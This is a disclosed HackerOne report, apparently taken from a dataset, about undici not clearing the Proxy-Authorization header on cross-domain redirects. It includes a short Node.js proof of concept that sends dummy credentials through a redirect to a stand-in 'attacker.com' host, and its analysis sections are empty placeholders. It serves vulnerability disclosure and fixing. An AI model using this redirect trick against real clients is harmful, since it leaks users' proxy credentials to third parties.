---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2352957'
original_report_id: '2352957'
title: Proxy-Authorization header is not cleared in cross-domain redirect in undici
weakness: Information Disclosure
team_handle: nodejs
created_at: '2024-02-02T16:09:11.207Z'
disclosed_at: '2024-03-12T02:17:13.563Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 14
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Proxy-Authorization header is not cleared in cross-domain redirect in undici

## Metadata

- HackerOne Report ID: 2352957
- Weakness: Information Disclosure
- Program: nodejs
- Disclosed At: 2024-03-12T02:17:13.563Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Steps To Reproduce:

I read this security advisory https://github.com/nodejs/undici/security/advisories/GHSA-wqq4-5wpv-mx2g.
It only clears authorization and cookie header during cross-domain redirect .
{F3024496}
As such this may lead to accidental leakage of "Proxy-Authorization" to a 3rd-party site.
```nodejs
import { request } from 'undici'
const {
    statusCode,
    headers,
    body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
    maxRedirections: 3,
    headers: {
        "autHorization": 'tes123t',
        "coOkie": "ddd=dddd",
        "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
        'Proxy-Authorization':'xxxxxxxx'
    }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}
```
{F3024501}


You can refer to this python code.
https://github.com/psf/requests/blob/main/src/requests/sessions.py#L318

References
https://github.com/psf/requests/issues/1885
https://fetch.spec.whatwg.org/#authentication-entries

## Impact

undici v6.5.0

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
